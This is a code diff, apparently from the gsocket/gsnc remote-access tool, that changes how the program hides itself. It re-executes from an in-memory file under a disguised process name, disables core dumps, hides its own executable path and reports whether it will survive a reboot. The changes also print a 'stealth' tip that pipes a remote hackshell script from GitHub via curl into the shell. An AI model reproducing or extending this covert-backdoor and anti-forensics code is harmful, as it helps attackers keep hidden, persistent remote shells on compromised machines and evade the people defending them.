@@ -93,20 +93,24 @@ cpy(int dst, int src) {
 	}
 }
 
-#ifndef HAVE_EXECVEAT
-# warning "No native execveat() support. Using direct syscall(__NR_execveat, ..) instead."
-# ifndef SYS_execveat
+#if !defined(HAVE_EXECVEAT) && defined(HAVE_SYSCALL_H)
+# if !defined(SYS_execveat) && defined(linux)
 #  define SYS_execveat 322
+#  warning "Using NR_execveat=322. Will work on linux/x86_64 only"
 # endif
+# ifdef SYS_execveat
+# warning "No native execveat() support. Using direct syscall(__NR_execveat, ..) instead."
 static int
 execveat(int fd, const char *pathname, char *const argv[], char *const *envp, int flags) {
 	return syscall(SYS_execveat /*__NR_execveat*/, fd, pathname, argv, envp, flags);
 }
+# define HAVE_EXECVEAT    1
+# endif
 #endif
 
 static int
 try_memexecme(int src, char *argv[]) {
-#if defined(HAVE_SYS_MMAN_H)
+#if defined(HAVE_SYS_MMAN_H) && defined(HAVE_MEMFD_CREATE) && defined(HAVE_EXECVEAT) && defined(MFD_CLOEXEC)
 	int fd;
 	if ((fd = memfd_create(gopt.proc_hiddenname, MFD_CLOEXEC)) < 0)
 		return -1;
@@ -159,7 +163,6 @@ try_execme(char *exename, char *argv[]) {
 
 	argv[0] = old_argv0;
 	XCLOSE(src);
-	unsetenv("_GS_PROC_EXENAME");
 	return -1;
 }
 
@@ -218,7 +221,6 @@ is_running(void) {
 	char cmd[128];
 	size_t cmd_sz = 0;
 
-	
 	// Get MY exe and cmdline
 	myexe_sz = read_proc_exe(myexe, sizeof myexe, mypid);
 	mycmd_sz = read_proc_cmd(mycmd, sizeof mycmd, mypid);
@@ -295,10 +297,23 @@ static void
 changeargv0_finish(void) {
 	char *ptr;
 
+	unsetenv("_GS_FS_EXENAME");
+	unsetenv("_GS_PROC_EXENAME");
+
 	if (is_running() == 0)
 		exit(0);
 
 	DEBUGF("Now hidden as prg_name=%s [orig EXENAME=%s]\n", gopt.prg_name, gopt.prg_exename);
+	// SEAL after config had been read.
+#ifdef PR_SET_DUMPABLE
+	prctl(PR_SET_DUMPABLE, 0);
+#endif
+#ifdef PR_SET_HIDE_SELF_EXE
+// Always compile it in and hope older kernel's will -EINVAL and newer kernels
+// will work without conflict of READ_CONFIG (somebody should test gsocket on new kernels)
+// # warning "NEW KERNEL FEATURE. Test if this causes us some problems with READ_CONFIG"
+	prctl(PR_SET_HIDE_SELF_EXE, 1);
+#endif
 	// try_ptraceme();
 	signal(SIGTRAP, SIG_IGN);
 	if ((ptr = getenv("_GS_DELME"))) {
@@ -309,18 +324,31 @@ changeargv0_finish(void) {
 
 static void
 try_changeargv0(int argc, char *argv[]) {
-	char *exename;
 	char *ptr;
 	int is_ldso = 0;
+	// On actual filesystem. Not /proc/self/exe. If
+	// set the used to report to user.
+	char *fs_exename = NULL;
+	// If executed from memfd then fs_exename is NULL. Need to read config from here
+	// and execve() this.
+	char *myself_exe = NULL;
 	gopt.err_fp = stderr;
 
 	if ((argv == NULL) || (argv[0] == NULL))
 		return;
 
-	exename = argv[0];
+	// First check if we called ourself and return immediately.
+	if ((ptr = getenv("_GS_FS_EXENAME"))) {
+		gopt.prg_exename = strdup(ptr);
+	}
+	if ((ptr = getenv("_GS_PROC_EXENAME"))) {
+		if (GSNC_config_read(ptr) != 0)
+			exit(0); // CAN NOT HAPPEN. (should have failed in parent already)
+		goto done;
+	}
 
 	if ((ptr = GS_GETENV2("EXENAME")) != NULL)
-		exename = ptr;
+		fs_exename = strdup(ptr);
 	else {
 		// Find true binary in case we were executed:
 		// - bash -c 'exec -a foobar /lib/ld-linux-aarch64.so.1 /usr/bin/gsnc'
@@ -329,20 +357,39 @@ try_changeargv0(int argc, char *argv[]) {
 		// but not if it is executed by ld-linux.
 		// Note: argv0 points to the gsnc if started with ld-linux.so
 		// but /proc/self/cmdline shows as argv0 == /lib/ld-linux.so
+		// stat(), open() and readlink have special behavior in /proc.
+		// realpath() will return NULL if deleted or not exist.
+		// readlink() will return link.
+		// stat(/proc/self/exe) will always succeed.
 		ptr = realpath("/proc/self/exe", NULL /* with malloc */);
 		if (ptr != NULL) {
+			// HERE: link destination EXISTS
 			if (strstr(ptr, "ld-linux") != NULL) {
 				is_ldso = 1;   // exename remains argv[0]
 				free(ptr);
-			} else {
-				exename = ptr; // NOT started with ld-linux.so. Update exename
 			}
-			// NOTE: if proc/PID/exe does not point to original binary then use argv[0].
+			 else if (strstr(ptr, "(deleted)") != NULL) {
+				// A sneaky user create "<name> (deleted)" file, which is not us.
+				free(ptr);
+			} else {
+				// Destination exists. Ignore argv0.
+				fs_exename = ptr; // points to true binary
+			}
+		} else {
+			// HERE: Link destination does _NOT_ exists. (memfd or delete)
+			myself_exe = "/proc/self/exe";
 		}
+		if (fs_exename == NULL)
+			fs_exename = realpath(argv[0], NULL /* malloc */);
 	}
 
+
+	if (myself_exe == NULL)
+		myself_exe = fs_exename;
+	DEBUGF("fs_Exename='%s' config_exe='%s'\n", fs_exename, myself_exe);
+
 	// This can never happen:
-	XASSERT(strstr(exename, "ld-linux") == NULL, "Oops. Set GS_EXENAME= to binary file.");
+	// XASSERT(strstr(fs_exename, "ld-linux") == NULL, "Oops. Set GS_EXENAME= to binary file.");
 
 	if (GS_GETENV2("CONFIG_CHECK")) {
 		gopt.flags |= GSC_FL_CONFIG_CHECK;
@@ -350,46 +397,24 @@ try_changeargv0(int argc, char *argv[]) {
 		return;
 	}
 
-	if (GS_GETENV2("CONFIG_WRITE") != NULL) {
-		gopt.prg_exename = strdup(exename);
+	gopt.prg_exename = fs_exename;
+
+	if (GS_GETENV2("CONFIG_WRITE") != NULL)
 		return;
-	}
 
-	if ((ptr = getenv("_GS_PROC_EXENAME"))) {
-		// Called ourselves.
-		gopt.prg_exename = strdup(ptr);
-		unsetenv("_GS_PROC_EXENAME");
-		if (GSNC_config_read(gopt.prg_exename) != 0)
-			exit(0); // CAN NOT HAPPEN. (should have failed in parent already)
-		goto done;
-	}
-
-	// HERE: Try to execute US from /dev/shm or at least change argv0
-	// Find absolute path of our own binary
-	if (exename[0] != '/') {
-		ptr = realpath(exename, NULL /* will malloc */);
-		if (ptr == NULL) {
-			DEBUGF("exename not found: '%s'\n", exename);
-			return;
-		}
-		exename = ptr;
-	}
-
-	if (GSNC_config_read(exename) != 0) {
-		DEBUGF("GSNC_config_read() failed\n");
+	if (GSNC_config_read(myself_exe) != 0)
 		return;
-	}
 
 	if (gopt.proc_hiddenname == NULL) {
 		DEBUGF("Config has no PROC_HIDDENNAME.\n");
-		gopt.prg_exename = exename;
-		return;
+		return; // Dont want to change argv0
 	}
 
-	// First try to copy & execute myself as /dev/shm/PROC_HIDDENNAME
-	setenv("_GS_PROC_EXENAME", exename, 1);
+	setenv("_GS_PROC_EXENAME", myself_exe, 1);
+	if (fs_exename != NULL)
+		setenv("_GS_FS_EXENAME", fs_exename, 1);
 
-	if (try_execme(exename, argv) == 0)
+	if (try_execme(myself_exe, argv) == 0)
 		exit(255); // CAN NOT HAPPEN. should -1 on execve fail.
 
 	// HERE: try_execme() FAILED. Last resort is to change just argv[0].
@@ -401,7 +426,7 @@ try_changeargv0(int argc, char *argv[]) {
 	// Otherwise, modify my argv[0]
 	argv[0] = gopt.proc_hiddenname;
 
-	execv(exename, argv);
+	execv(myself_exe, argv);
 	DEBUGF("execv()=%s\n", strerror(errno));
 	// Re-Execution not possible. Continue with current argv0 name.
 done:
@@ -495,16 +520,7 @@ init_defaults1(int argc, char *argv[]) {
 		return;
 	}
 
-#ifdef PR_SET_DUMPABLE
-	prctl(PR_SET_DUMPABLE, 0);
-#endif
-#ifdef PR_SET_HIDE_SELF_EXE
-// Always compile it in and hope older kernel's will -EINVAL and newer kernels
-// will work without conflict of READ_CONFIG (somebody should test gsocket on new kernels)
-// # warning "NEW KERNEL FEATURE. Test if this causes us some problems with READ_CONFIG"
-	prctl(PR_SET_HIDE_SELF_EXE, 1);
-#endif
-	
+
 	try_changeargv0(argc, argv); // If wanted, calls GSNC_config_read()
 	if (gopt.flags & GSC_FL_CONFIG_CHECK)
 		return;
@@ -1600,10 +1616,10 @@ pty_cmd(GS_CTX *ctx, const char *cmd, pid_t *pidptr, int *err)
 ", str);
 	if (gopt.flags & GSC_FL_IS_STEALTH) {
 		printf("\
-=Tip            : "CDC"source <(curl -SsfL https://thc.org/hs)"CN"\n");
+=Tip            : "CDC"source <(curl -SsfL https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)"CN"\n");
 #if 0
 		printf("\
-=Tip            : "CDC"source <(curl -SsfL https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)"CN"\n");
+=Tip            : "CDC"source <(curl -SsfL https://thc.org/hs)"CN"\n");
 #endif
 	}
 	if (GS_getenv("PS1") == NULL) {
@@ -1647,12 +1663,28 @@ pty_cmd(GS_CTX *ctx, const char *cmd, pid_t *pidptr, int *err)
 	// Cant use C.UTF-8 here because it screws up `systemctl status` output
 	envp[envplen++] = "LANG=en_US.UTF-8";
 	envp[envplen++] = "GS_CONFIG_READ=0";
-	if (gopt.prg_exename != NULL) {
+
+	char *ptr = gopt.prg_exename;
+	if (ptr == NULL) {
+		printf("="CDR"WARNING"CN"        : GSNC is not installed permanently (will not survive a reboot)\n");
+	} else {
 		struct stat sb;
-		if (stat(gopt.prg_exename, &sb) != 0) {
-			printf("="CDR"WARNING"CN"        : GSNC has been removed: "CDY"%s"CN"\n", gopt.prg_exename);
+		if (stat(ptr, &sb) != 0) {
+			printf("="CDR"WARNING"CN"        : GSNC has been removed: "CDY"%s"CN"\n", ptr);
+			ptr = NULL;
+		} 
+	}
+	if (ptr == NULL) {
+		char procpidexe[64];
+		snprintf(procpidexe, sizeof procpidexe, "/proc/%d/exe", getpid());
+		if ((fd = open(procpidexe, O_RDONLY)) >= 0) {
+			close(fd);
+			ptr = procpidexe;
 		}
-		snprintf(buf, sizeof buf, "GSNC=%s", gopt.prg_exename);
+	}
+
+	if (ptr != NULL) {
+		snprintf(buf, sizeof buf, "GSNC=%s", ptr);
 		envp[envplen++] = strdup(buf);
 	}
 
